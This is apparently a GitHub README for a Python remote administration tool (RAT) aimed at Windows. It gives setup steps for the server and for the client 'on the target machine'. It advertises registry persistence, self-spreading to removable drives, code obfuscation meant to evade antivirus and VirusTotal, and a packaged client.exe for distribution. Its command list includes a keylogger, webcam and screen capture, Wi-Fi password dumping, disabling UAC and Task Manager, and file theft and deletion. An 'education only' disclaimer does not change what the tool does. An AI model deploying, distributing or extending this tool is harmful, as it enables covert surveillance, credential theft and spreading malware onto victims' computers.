# **Python RAT - Remote Administration Tool**

This project is an advanced Remote Administration Tool (RAT) for Windows systems, written in Python. It has been modified and improved from an original repository with several additional features.

## **Target Systems**

Windows operating systems.

## **Requirements**

Before running the RAT, ensure you have the following modules and dependencies installed:

- Pillow
- pywin32
- opencv-python
- comtypes
- pycaw (requires C++ Build Tools) (optional feature)
- pyautogui
- vidstream (requires VS Code) (optional feature)

Additional requirements:

- Python 3.x installed.
- PyInstaller is used for compiling to an executable.

## **Server Usage**

Follow these steps to run the server:

```bash
git clone https://github.com/Isi-17/Python-RAT
cd Python-RAT
pip install -r server_requirements.txt
python server.py
```

## **Client Usage**

To run the client on the target machine:

```bash
git clone https://github.com/Isi-17/Python-RAT
cd Python-RAT
pip install -r client_requirements.txt
pythonw client.pyw
```

### **Improvement made:**

The client has also been packaged as an executable for easier distribution:

- The compressed executable file is located in the `dist` folder under the name **client.exe**.

## **Modifications Made**

The following enhancements and additional features have been added to the original code:

### 1. **Persistence (Function f1)**

A persistence feature has been added that allows the RAT to run automatically when the operating system starts. This function creates a registry key in the Windows system to ensure continuous execution.

### 2. **Automatic Propagation to Removable Media (Function f2)**

The RAT can now automatically replicate itself on connected devices. This functionality enables malware propagation through removable drives.

### 3. **Code Obfuscation**

The entire client code (`client.pyw`) has been obfuscated, significantly reducing the likelihood of detection by antivirus programs. This helps avoid detection by analysis tools such as VirusTotal.

### 4. **Compilation to Executable**

The RAT has been packaged as an executable file (**client.exe**) in the `dist` folder, allowing easier distribution without relying on Python installation on the target machine.

## **Available Commands in the RAT**

### **System**

```bash
help                      # List all available commands
writein <text>            # Write text to the currently opened window
browser                   # Perform a query in the browser
turnoffmon                # Turn off the monitor
turnonmon                 # Turn on the monitor
reboot                    # Reboot the system
drivers                   # List all drivers of the PC
kill                      # Terminate a system task
sendmessage               # Send a messagebox with text
cpu_cores                 # Number of CPU cores
systeminfo (extended)     # Extended system information (via cmd)
tasklist                  # List all running tasks
localtime                 # Display the current system time
curpid                    # PID of the client's process
sysinfo (shrinked)        # Basic system information (Python-based)
shutdown                  # Shutdown the client's PC
isuseradmin               # Check if the user is an admin
extendrights              # Extend system privileges
disabletaskmgr            # Disable Task Manager
enabletaskmgr             # Enable Task Manager
disableUAC                # Disable User Account Control (UAC)
monitors                  # List all connected monitors
geolocate                 # Get the computer's location
volumeup                  # Increase system volume to 100%
volumedown                # Decrease system volume to 0%
setvalue                  # Set a value in the registry
delkey                    # Delete a key from the registry
createkey                 # Create a key in the registry
setwallpaper              # Set the desktop wallpaper
exit                      # Terminate the RAT session
```

### **Shell**

```bash
pwd                       # Get the current working directory
shell                     # Execute commands via cmd
cd                        # Change directory
[Driver]:                 # Change to specified drive
cd ..                     # Move to the previous directory
dir                       # List all files in the current directory
abspath                   # Get absolute path of files
```

### **Network**

```bash
ipconfig                  # Show local IP
portscan                  # Perform a port scan
profiles                  # List network profiles
profilepswd               # Show password for a network profile
```

### **Input Devices**

```bash
keyscan_start             # Start keylogger
send_logs                 # Send captured keystrokes
stop_keylogger            # Stop keylogger
disable(--keyboard/--mouse/--all) # Disable input devices
enable(--keyboard/--mouse/--all)  # Enable input devices
```

### **Video**

```bash
screenshare               # Share the remote PC's screen
webcam                    # Capture video from the webcam
breakstream               # Stop the webcam/screenshare stream
screenshot                # Take a screenshot
webcam_snap               # Capture a photo from the webcam
```

### **Files**

```bash
delfile <file>            # Delete a file
editfile <file> <text>    # Edit a file
createfile <file>         # Create a file
download <file> <homedir> # Download a file
upload                    # Upload a file
cp <file1> <file2>        # Copy a file
mv <file> <path>          # Move a file
searchfile <file> <dir>   # Search for a file in a specified directory
mkdir <dirname>           # Create a directory
rmdir <dirname>           # Remove a directory
startfile <file>          # Open or execute a file
readfile <file>           # Read contents of a file
```


## Disclamer

THIS SOFTWARE IS INTENDED ONLY FOR EDUCATION PURPOSES! DO NOT USE IT TO INFLICT 
DAMAGE TO ANYONE! USING MY APPLICATION YOU ARE AUTHOMATICALLY AGREE WITH ALL RULES AND
TAKE RESPONSIBITITY FOR YOUR ACTION! THE VIOLATION OF LAWS CAN CAUSE SERIOUS CONSEQUENCES!
THE DEVELOPER FZGbzuw412 ASSUMES NO LIABILITY AND IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE 
CAUSED BY THIS PROGRAM.

## Licence
  
    Copyright (c) 2022 FZGbzuw412

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
